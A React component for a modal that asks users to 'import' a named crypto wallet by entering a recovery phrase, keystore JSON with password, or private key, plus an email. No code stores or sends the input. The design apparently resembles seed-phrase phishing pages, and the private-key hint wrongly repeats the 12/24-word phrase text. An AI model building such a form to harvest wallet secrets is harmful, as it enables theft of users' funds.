import React, { useState } from "react";

const ImportWallet = ({ wallet, onClose }) => {
  const [activeTab, setActiveTab] = useState("Phrase");

  if (!wallet) return null;

  const tabs = ["Phrase", "Keystore JSON", "Private Key"];

  const renderTabContent = () => {
    switch (activeTab) {
      case "Phrase":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Phrase</label>
            <textarea
              rows={3}
              placeholder="Enter your recovery phrase"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none resize-none text-sm"
            />
            <p className="text-xs text-gray-400 mt-1">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>
          </div>
        );

      case "Keystore JSON":
        return (
          <div className="space-y-3">
            <div>
              <label className="block text-sm font-bold mb-2">
                Keystore JSON
              </label>
              <textarea
                rows={2}
                placeholder="Keystore JSON"
                className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none resize-none font-mono text-xs"
              />
            </div>

            <div>
              <label className="block text-sm font-bold mb-2">Password</label>
              <input
                type="password"
                placeholder="Wallet password"
                className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
              />
              <p className="text-xs text-gray-400 mt-1">
                Several lines of text beginning with {"{...}"} plus the password
                you used to encrypt it.
              </p>
            </div>
          </div>
        );

      case "Private Key":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Private Key</label>
            <input
              type="text"
              placeholder="Enter your private key"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
            <p className="text-xs text-gray-400 mt-1">
              Typically 12 (sometimes 24) words separated by a single space.
            </p>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div
      className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-3 sm:p-4"
      onClick={onClose}
    >
      <div
        className="bg-[#e9f8ff] text-[#0E1D26] w-full max-w-lg rounded-2xl shadow-2xl flex flex-col animate-modal-in overflow-hidden max-h-[85vh]"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="p-4 sm:p-6 border-b border-gray-100 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="w-10 h-10 sm:w-14 sm:h-14 rounded-full bg-white border border-gray-100 flex items-center justify-center overflow-hidden">
              <img src={wallet.icon} alt="" className="object-contain w-6 sm:w-8" />
            </div>

            <h2 className="text-sm sm:text-lg font-bold leading-tight">
              Import your {wallet.name} Wallet
            </h2>
          </div>

          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-5 w-5 sm:h-6 sm:w-6"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>

        {/* Tabs */}
        <div className="flex px-3 sm:px-6 border-b border-gray-100 overflow-x-auto">
          {tabs.map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`py-3 px-3 sm:px-4 text-sm sm:text-base whitespace-nowrap relative ${
                activeTab === tab ? "text-black" : "text-gray-400"
              }`}
            >
              {tab}
              {activeTab === tab && (
                <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-black" />
              )}
            </button>
          ))}
        </div>

        {/* Body */}
        <div className="p-4 sm:p-6 space-y-4 overflow-y-auto">
          <div>
            <label className="block text-sm font-bold mb-2">Name wallet</label>
            <input
              type="text"
              placeholder="Name wallet"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
          </div>

          <div>
            <label className="block text-sm font-bold mb-2">Email</label>
            <input
              type="email"
              placeholder="Email"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
          </div>

          <div>{renderTabContent()}</div>

          {/* Buttons */}
          <div className="flex gap-2 sm:gap-3 pt-2">
            <button
              onClick={onClose}
              className="flex-1 py-2 sm:py-3 px-4 rounded-xl bg-[#D63384] text-white font-bold text-sm"
            >
              Cancel
            </button>

            <button className="flex-1 py-2 sm:py-3 px-4 rounded-xl bg-[#007B8F] text-white font-bold text-sm uppercase">
              Proceed
            </button>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes modalIn {
          from {
            opacity: 0;
            transform: scale(0.95) translateY(10px);
          }
          to {
            opacity: 1;
            transform: scale(1) translateY(0);
          }
        }

        .animate-modal-in {
          animation: modalIn 0.2s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

export default ImportWallet;